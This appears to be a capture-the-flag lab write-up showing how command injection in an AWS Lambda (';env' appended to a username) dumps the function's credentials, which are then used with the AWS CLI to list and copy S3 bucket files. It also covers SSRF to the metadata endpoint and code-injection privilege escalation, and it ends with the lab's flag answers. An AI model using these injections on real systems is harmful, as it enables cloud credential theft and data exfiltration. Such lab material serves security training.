# Lab 4 - Escape from jAWS!

## Table of Contents
- [Lab 4 - Escape from jAWS!](#lab-4---escape-from-jaws)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
  - [Analysis](#analysis)
    - [Command Injection](#command-injection)
    - [Accessing the S3 Bucket](#accessing-the-s3-bucket)
  - [Solution](#solution)
  - [Navigation](#navigation)

---

## Overview

You are given an AWS Lambda that is vulnerable to RCE.

---

## Analysis

There is a way to exploit AWS Lambda to gain remote code execution (RCE) access to S3 Buckets:

- **Command Injection:** A common method is exploiting command injection in Lambda-triggered web applications. By manipulating file upload endpoints (e.g., `POST /Prod/api/file/testfile;whoami`), attackers can execute arbitrary OS commands, leading to RCE. Once inside, environment variables containing AWS credentials (e.g., `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`) can be dumped using the `env` command.
- **SSRF Vulnerabilities:** Server-Side Request Forgery (SSRF) in Lambda functions can be exploited to access internal AWS metadata endpoints (e.g., `http://169.254.169.254/latest/meta-data`) or files like `/proc/self/environ`. Tools like SSRFmap or custom payloads can retrieve temporary credentials tied to the Lambda execution role, which often have access to private S3 buckets.
- **Privilege Escalation via Lambda Code Injection:** If the compromised IAM user has `UpdateFunctionCode` and `UpdateFunctionConfiguration` permissions, attackers can modify existing Lambda functions. By injecting malicious code (e.g., to create new IAM users or access secrets), attackers can escalate privileges and retrieve sensitive data from S3 buckets.
- **Post-Exploitation:** With valid AWS credentials, attackers use the AWS CLI to list and download objects from S3 buckets (e.g., `aws s3 ls s3://bucket-name` or `aws s3 cp s3://bucket-name/file.txt ./`).

### Command Injection
The information below can be obtained by entering `;env` after the user name.
```bash
AWS_ACCESS_KEY_ID=<SECRET_VALUE_1>
AWS_DEFAULT_REGION=eu-west-1
AWS_EXECUTION_ENV=AWS_Lambda_python3.9
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=128
AWS_LAMBDA_FUNCTION_NAME=tickets
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
AWS_LAMBDA_INITIALIZATION_TYPE=on-demand
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/tickets
AWS_LAMBDA_LOG_STREAM_NAME=2024/10/06/[$LATEST]2263ff70320b4ed09fd27a7dead39106
AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001
AWS_REGION=eu-west-1
AWS_SECRET_ACCESS_KEY=<SECRET_VALUE_2>
AWS_SESSION_TOKEN=<SECRET_VALUE_3>
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
AWS_XRAY_DAEMON_ADDRESS=169.254.79.129:2000
LAMBDA_RUNTIME_DIR=/var/runtime
LAMBDA_TASK_ROOT=/var/task
LANG=en_US.UTF-8
LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin
PWD=/var/task
PYTHONPATH=/var/runtime
SHLVL=1
TZ=:UTC
_=/usr/bin/env
_AWS_XRAY_DAEMON_ADDRESS=169.254.79.129
_AWS_XRAY_DAEMON_PORT=2000
_HANDLER=tickets.main
_X_AMZN_TRACE_ID=Root=1-6701fa72-3eb38a886877af9d5ff2d377;Parent=307f924fee814eb9;Sampled=0;Lineage=1:13e15196:0
```

In this output, we can see AWS credentials in the following environment variables: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`.

- **AWS_ACCESS_KEY_ID:** Usually 20 characters, alphanumeric, starting with AKIA (long-lived) or ASIA (temporary).
  - **RegEx Pattern:** `(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}`
- **AWS_SECRET_ACCESS_KEY:** Typically 40 characters, containing alphanumeric characters, slashes (`/`), plus signs (`+`), and equal signs (`=`).
  - **RegEx Pattern:** `[A-Za-z0-9/+=]{40}`
- **AWS_SESSION_TOKEN:** A long, base64-encoded string required only when using temporary security credentials (IAM roles/STS). It is significantly longer than the keys and has no fixed length.

### Accessing the S3 Bucket

Let's use the AWS CLI utility with the AWS credentials environment variables to view the files and folders in the S3 bucket.

Set the environment variables:
```bash
export AWS_ACCESS_KEY_ID=<SECRET_VALUE_1>
export AWS_SECRET_ACCESS_KEY=<SECRET_VALUE_2>
export AWS_SESSION_TOKEN=<SECRET_VALUE_3>
```

To list the content in the S3 bucket:
```bash
aws s3 ls s3://<s3-bucket-name>/
```

To copy files from the S3 bucket:
```bash
aws s3 cp s3://<s3-bucket-name>/<filename> .
```

This gets all the files in the S3 bucket for further analysis.

---

## Solution

What is the key, or name, of the object in the shark food bucket? `robo_fish_4_robo_sharks`

The override code to eject a log flume carriage is: `AllAboardThisCarriage`

---

## Navigation

| | |
|:---|---:|
| ← [The Cursed Crypt](../lab-3-the-cursed-crypt/README.md) | [Carnival Chaos](../lab-5-carnival-chaos/README.md) → |
